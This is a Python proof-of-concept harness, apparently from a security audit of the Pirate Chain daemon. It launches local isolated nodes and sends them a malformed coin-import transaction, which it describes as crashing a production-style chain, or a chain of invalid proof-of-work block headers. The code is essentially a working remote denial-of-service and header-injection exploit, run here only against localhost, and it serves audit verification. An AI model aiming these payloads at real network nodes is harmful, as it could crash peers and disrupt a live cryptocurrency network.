#!/usr/bin/env python3
"""
Running-daemon PoC harness for the PirateNetwork/pirate audit.

Launches isolated pirated datadirs (P2P/RPC bound to 127.0.0.1), performs a
normal P2P handshake, and delivers either a malformed coin-import `tx` or a
chain of invalid-PoW `headers` messages.

Cases:
  --case coin-regtest     Malformed coin-import tx under -regtest (negative control).
  --case coin-local-prod  Malformed coin-import tx against a production-style local
                          asset chain that has left IBD (crash confirmation).
  --case headers-regtest  Invalid-PoW headers accepted as header-only best chain state.

Adjust REPO / PIRATED to the local build path before running.
"""
import argparse
import base64
import hashlib
import http.client
import json
from pathlib import Path
import random
import re
import shutil
import socket
import struct
import subprocess
import tempfile
import time


REPO = Path("/home/antics/codex-pirate-audit/pirate")
PIRATED = REPO / "src" / "pirated"
RPC_USER = "rt"
RPC_PASS = "rt"


def sha256d(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def ser_varint(n):
    if n < 0xfd:
        return bytes([n])
    if n <= 0xffff:
        return b"\xfd" + struct.pack("<H", n)
    if n <= 0xffffffff:
        return b"\xfe" + struct.pack("<I", n)
    return b"\xff" + struct.pack("<Q", n)


def ser_varbytes(data):
    return ser_varint(len(data)) + data


def ser_uint256_from_rpc_hash(hex_hash):
    return bytes.fromhex(hex_hash)[::-1]


def deser_uint256_to_rpc_hash(raw):
    return raw[::-1].hex()


def make_p2p_message(magic, command, payload):
    cmd = command.encode("ascii")
    if len(cmd) > 12:
        raise ValueError("command too long")
    return magic + cmd + (b"\x00" * (12 - len(cmd))) + struct.pack("<I", len(payload)) + sha256d(payload)[:4] + payload


def recvall(sock, n):
    chunks = []
    remaining = n
    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionError("socket closed")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def read_p2p_message(sock, magic, timeout=30):
    sock.settimeout(timeout)
    hdr = recvall(sock, 24)
    if hdr[:4] != magic:
        raise ValueError("unexpected message magic: %s" % hdr[:4].hex())
    command = hdr[4:16].split(b"\x00", 1)[0].decode("ascii", "replace")
    length = struct.unpack("<I", hdr[16:20])[0]
    checksum = hdr[20:24]
    payload = recvall(sock, length)
    if sha256d(payload)[:4] != checksum:
        raise ValueError("bad p2p checksum for %s" % command)
    return command, payload


def ser_addr(ip, port):
    return (
        struct.pack("<Q", 1)
        + (b"\x00" * 10)
        + b"\xff\xff"
        + socket.inet_aton(ip)
        + struct.pack(">H", port)
    )


def version_payload(port, version=170013):
    return (
        struct.pack("<iQq", version, 1, int(time.time()))
        + ser_addr("127.0.0.1", port)
        + ser_addr("0.0.0.0", 0)
        + struct.pack("<Q", random.getrandbits(64))
        + ser_varbytes(b"/codex-local-e2e:0.1/")
        + struct.pack("<i", 0)
    )


def p2p_handshake(port, magic):
    sock = socket.create_connection(("127.0.0.1", port), timeout=30)
    sock.sendall(make_p2p_message(magic, "version", version_payload(port)))
    got_version = False
    got_verack = False
    deadline = time.time() + 30
    while time.time() < deadline and not (got_version and got_verack):
        command, payload = read_p2p_message(sock, magic, timeout=max(1, int(deadline - time.time())))
        if command == "version":
            got_version = True
            sock.sendall(make_p2p_message(magic, "verack", b""))
        elif command == "verack":
            got_verack = True
        elif command == "ping":
            sock.sendall(make_p2p_message(magic, "pong", payload))
    if not (got_version and got_verack):
        raise TimeoutError("p2p handshake did not complete")
    return sock


def p2p_handshake_any(port, magic):
    candidates = []
    for candidate in (magic, magic[::-1]):
        if candidate not in candidates:
            candidates.append(candidate)
    errors = []
    for candidate in candidates:
        try:
            return p2p_handshake(port, candidate), candidate
        except Exception as exc:
            errors.append("%s:%s" % (candidate.hex(), exc))
    raise ConnectionError("p2p handshake failed for all magic candidates: " + "; ".join(errors))


def rpc_call(rpcport, method, params=None, timeout=30):
    if params is None:
        params = []
    body = json.dumps({"jsonrpc": "1.0", "id": "codex", "method": method, "params": params}).encode()
    auth = base64.b64encode(("%s:%s" % (RPC_USER, RPC_PASS)).encode()).decode()
    conn = http.client.HTTPConnection("127.0.0.1", rpcport, timeout=timeout)
    conn.request(
        "POST",
        "/",
        body=body,
        headers={
            "Authorization": "Basic " + auth,
            "Content-Type": "application/json",
        },
    )
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    if resp.status != 200:
        raise RuntimeError("RPC HTTP %d: %s" % (resp.status, data.decode("utf-8", "replace")))
    parsed = json.loads(data.decode())
    if parsed.get("error"):
        raise RuntimeError("RPC %s error: %s" % (method, parsed["error"]))
    return parsed["result"]


def wait_rpc(proc, rpcport, timeout=120):
    deadline = time.time() + timeout
    last_error = None
    while time.time() < deadline:
        if proc.poll() is not None:
            raise RuntimeError("daemon exited early with code %s" % proc.returncode)
        try:
            return rpc_call(rpcport, "getblockcount", [], timeout=3)
        except Exception as exc:
            last_error = exc
            time.sleep(1)
    raise TimeoutError("RPC did not come up: %s" % last_error)


def debug_text(datadir, stdout_path):
    pieces = []
    for path in Path(datadir).rglob("debug.log"):
        try:
            pieces.append(path.read_text(errors="replace"))
        except OSError:
            pass
    try:
        pieces.append(Path(stdout_path).read_text(errors="replace"))
    except OSError:
        pass
    return "\n".join(pieces)


def parse_magic(datadir, stdout_path, fallback=None):
    text = debug_text(datadir, stdout_path)
    matches = re.findall(r"MessageStart:\s*([0-9a-fA-F]{8})", text)
    if matches:
        return bytes.fromhex(matches[-1])
    matches = re.findall(r"magic\.([0-9a-fA-F]{8})", text)
    if matches:
        return struct.pack("<I", int(matches[-1], 16))
    if fallback is not None:
        return fallback
    raise RuntimeError("could not parse p2p magic from logs")


def launch_node(label, *, regtest, asset_name=None, sapling_height=None, extra_args=None):
    datadir = Path(tempfile.mkdtemp(prefix="pirate-e2e-%s-" % label))
    stdout_path = datadir / "daemon.stdout.log"
    port = random.randrange(25000, 45000)
    rpcport = port + 1
    args = [
        str(PIRATED),
        "-datadir=%s" % datadir,
        "-server=1",
        "-showmetrics=0",
        "-rpcuser=%s" % RPC_USER,
        "-rpcpassword=%s" % RPC_PASS,
        "-rpcport=%d" % rpcport,
        "-rpcbind=127.0.0.1",
        "-rpcallowip=127.0.0.1",
        "-listen=1",
        "-bind=127.0.0.1",
        "-port=%d" % port,
        "-discover=0",
        "-dns=0",
        "-dnsseed=0",
        "-connect=0",
        "-listenonion=0",
        "-tlsenforcement=0",
        "-tlsfallbacknontls=1",
        "-plaintextpeer=127.0.0.1",
        "-debug=params",
        "-debug=net",
        "-debug=mempool",
    ]
    if regtest:
        args.append("-regtest")
    if sapling_height is not None:
        args.append("-nuparams=76b809bb:%d" % sapling_height)
        args.append("-nuparams=5ba81b19:%d" % sapling_height)
    if asset_name:
        args.extend([
            "-ac_name=%s" % asset_name,
            "-ac_supply=0",
            "-ac_reward=25600000000",
            "-ac_halving=77777",
            "-ac_private=1",
        ])
        if asset_name != "PIRATE":
            args.append("-ac_sapling=%d" % (sapling_height or 1))
    if extra_args:
        args.extend(extra_args)

    out = open(stdout_path, "wb")
    proc = subprocess.Popen(args, stdout=out, stderr=subprocess.STDOUT)
    wait_rpc(proc, rpcport)
    return {
        "label": label,
        "datadir": datadir,
        "stdout_path": stdout_path,
        "port": port,
        "rpcport": rpcport,
        "proc": proc,
        "stdout_file": out,
        "args": args,
    }


def stop_node(node):
    proc = node["proc"]
    try:
        if proc.poll() is None:
            try:
                rpc_call(node["rpcport"], "stop", [], timeout=5)
            except Exception:
                pass
            try:
                proc.wait(timeout=20)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=10)
    finally:
        try:
            node["stdout_file"].close()
        except Exception:
            pass


def cleanup_node(node, keep):
    if keep:
        return
    try:
        shutil.rmtree(node["datadir"])
    except OSError:
        pass


def make_coin_import_empty_push_tx(variant=1):
    payload = b""
    payload += struct.pack("<I", 0x80000004)
    payload += struct.pack("<I", 0x892F2085)
    payload += ser_varint(1)
    payload += (bytes([variant & 0xFF]) + b"\x00" * 31)
    payload += struct.pack("<I", 1000000000)
    payload += ser_varbytes(b"\x4c\x00")
    payload += struct.pack("<I", 0xFFFFFFFF)
    payload += ser_varint(1)
    payload += struct.pack("<q", 0)
    payload += ser_varbytes(b"\x6a")
    payload += struct.pack("<I", variant & 0xFFFFFFFF)
    payload += struct.pack("<I", 0)
    payload += struct.pack("<q", 0)
    payload += ser_varint(0)
    payload += ser_varint(0)
    payload += ser_varint(0)
    return payload


def try_coin_import(node, magic, p2p_first=False, p2p_count=1):
    tx = make_coin_import_empty_push_tx(1)
    before = {"pid": node["proc"].pid, "alive": node["proc"].poll() is None}
    rpc_result = None
    rpc_error = None
    p2p_error = None
    p2p_magic = None

    def do_rpc():
        nonlocal rpc_result, rpc_error
        try:
            rpc_result = rpc_call(node["rpcport"], "sendrawtransaction", [tx.hex()], timeout=10)
        except Exception as exc:
            rpc_error = str(exc)
        time.sleep(2)

    def do_p2p():
        nonlocal p2p_error, p2p_magic
        try:
            sock, p2p_magic = p2p_handshake_any(node["port"], magic)
            for i in range(1, p2p_count + 1):
                variant_tx = make_coin_import_empty_push_tx(i)
                sock.sendall(make_p2p_message(p2p_magic, "tx", variant_tx))
                time.sleep(0.1)
                if node["proc"].poll() is not None:
                    break
            time.sleep(5)
            sock.close()
        except Exception as exc:
            p2p_error = str(exc)

    if p2p_first:
        do_p2p()
        after_p2p = {"returncode": node["proc"].poll(), "alive": node["proc"].poll() is None}
        if after_p2p["alive"]:
            do_rpc()
        after_rpc = {"returncode": node["proc"].poll(), "alive": node["proc"].poll() is None}
    else:
        do_rpc()
        after_rpc = {"returncode": node["proc"].poll(), "alive": node["proc"].poll() is None}
        if after_rpc["alive"]:
            do_p2p()
        after_p2p = {"returncode": node["proc"].poll(), "alive": node["proc"].poll() is None}

    return {
        "tx_hex": tx.hex(),
        "p2p_count": p2p_count,
        "before": before,
        "p2p_first": p2p_first,
        "rpc_result": rpc_result,
        "rpc_error": rpc_error,
        "after_rpc": after_rpc,
        "p2p_magic": p2p_magic.hex() if p2p_magic else None,
        "p2p_error": p2p_error,
        "after_p2p": after_p2p,
    }


def make_fake_header(prev_hash, nbits, ntime, nonce_byte):
    header = b""
    header += struct.pack("<i", 4)
    header += ser_uint256_from_rpc_hash(prev_hash)
    header += bytes([nonce_byte]) * 32
    header += b"\x00" * 32
    header += struct.pack("<I", ntime)
    header += struct.pack("<I", int(nbits, 16) if isinstance(nbits, str) else int(nbits))
    header += bytes([nonce_byte ^ 0x5A]) * 32
    header += ser_varbytes(b"")
    return header


def fake_header_hash(header):
    return deser_uint256_to_rpc_hash(sha256d(header))


def send_fake_headers(node, magic, count=3):
    info_before = rpc_call(node["rpcport"], "getblockchaininfo", [])
    prev = rpc_call(node["rpcport"], "getbestblockhash", [])
    parent_header = rpc_call(node["rpcport"], "getblockheader", [prev])
    nbits = parent_header["bits"]
    ntime = max(int(parent_header["time"]) + 1, int(time.time()) + 1)
    headers = []
    hashes = []
    for i in range(count):
        hdr = make_fake_header(prev, nbits, ntime + i, i + 1)
        h = fake_header_hash(hdr)
        headers.append(hdr)
        hashes.append(h)
        prev = h
    sock, used_magic = p2p_handshake_any(node["port"], magic)
    payload = ser_varint(len(headers)) + b"".join(h + b"\x00" for h in headers)
    sock.sendall(make_p2p_message(used_magic, "headers", payload))
    time.sleep(2)
    sock.close()
    info_after = rpc_call(node["rpcport"], "getblockchaininfo", [])
    tips = rpc_call(node["rpcport"], "getchaintips", [])
    return {
        "before": info_before,
        "after": info_after,
        "p2p_magic": used_magic.hex(),
        "sent_header_hashes": hashes,
        "chain_tips": tips,
    }


def run_header_regtest(keep):
    node = None
    try:
        node = launch_node("headers-regtest", regtest=True, sapling_height=1)
        magic = parse_magic(node["datadir"], node["stdout_path"], fallback=bytes.fromhex("aa8ef3f5"))
        result = send_fake_headers(node, magic)
        result["magic"] = magic.hex()
        result["datadir"] = str(node["datadir"])
        result["args"] = node["args"]
        return result
    finally:
        if node:
            stop_node(node)
            cleanup_node(node, keep)


def run_coin_regtest(keep):
    node = None
    try:
        node = launch_node("coin-regtest", regtest=True, asset_name="PIRATE", sapling_height=1)
        magic = parse_magic(node["datadir"], node["stdout_path"], fallback=bytes.fromhex("aa8ef3f5"))
        result = try_coin_import(node, magic)
        result["magic"] = magic.hex()
        result["datadir"] = str(node["datadir"])
        result["args"] = node["args"]
        result["logs_tail"] = debug_text(node["datadir"], node["stdout_path"])[-4000:]
        return result
    finally:
        if node:
            stop_node(node)
            cleanup_node(node, keep)


def run_coin_local_production(keep):
    node = None
    try:
        node = launch_node(
            "coin-local-prod",
            regtest=False,
            asset_name="LOCALARRR",
            sapling_height=None,
            extra_args=["-maxtipage=2000000000"],
        )
        magic = parse_magic(node["datadir"], node["stdout_path"])
        result = try_coin_import(node, magic, p2p_first=True, p2p_count=50)
        result["magic"] = magic.hex()
        result["datadir"] = str(node["datadir"])
        result["args"] = node["args"]
        result["logs_tail"] = debug_text(node["datadir"], node["stdout_path"])[-4000:]
        return result
    finally:
        if node:
            stop_node(node)
            cleanup_node(node, keep)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--case", choices=["headers-regtest", "coin-regtest", "coin-local-prod", "all"], default="all")
    parser.add_argument("--keep", action="store_true")
    args = parser.parse_args()

    if not PIRATED.exists():
        raise SystemExit("missing pirated binary: %s" % PIRATED)

    cases = []
    if args.case in ("headers-regtest", "all"):
        cases.append(("headers-regtest", run_header_regtest))
    if args.case in ("coin-regtest", "all"):
        cases.append(("coin-regtest", run_coin_regtest))
    if args.case in ("coin-local-prod", "all"):
        cases.append(("coin-local-prod", run_coin_local_production))

    out = {}
    for name, fn in cases:
        print("=== %s ===" % name, flush=True)
        try:
            out[name] = fn(args.keep)
            print(json.dumps(out[name], indent=2, sort_keys=True), flush=True)
        except Exception as exc:
            out[name] = {"error": str(exc)}
            print(json.dumps(out[name], indent=2, sort_keys=True), flush=True)
    print("=== summary-json ===")
    print(json.dumps(out, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
